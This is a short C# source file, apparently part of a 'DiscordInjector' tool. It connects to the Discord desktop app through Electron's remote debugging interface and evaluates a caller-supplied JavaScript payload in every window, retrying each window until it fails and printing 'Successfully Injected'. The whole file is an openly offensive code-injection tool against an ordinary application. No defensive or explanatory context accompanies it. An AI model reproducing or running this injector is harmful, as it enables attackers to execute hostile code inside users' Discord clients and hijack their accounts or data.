using System;
using System.Collections.Generic;
using System.Threading.Tasks;

namespace DiscordInjector
{
    class DiscordWebsocket
    {
        public static async Task Inject(ElectronRemoteDebugger erd, string payload)
        {
            var visitedWindows = new List<string>();
            var windowList = erd.windows();
            foreach (var window in windowList)
            {
                Uri windowUri = window.Item1;
                string windowId = window.Item2;

                if (visitedWindows.Contains(windowId))
                    continue;

                for (int i = 0; i < 30; i++)
                {
                    try
                    {
                        await erd.eval(windowUri, payload);
                        Console.Write("Successfully Injected...\n");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Could not Connect URL: [{windowUri.ToString()}]...\n");
                        break;
                    }
                }
                visitedWindows.Add(windowId);
            }
            Console.Read();
        }
    }
}
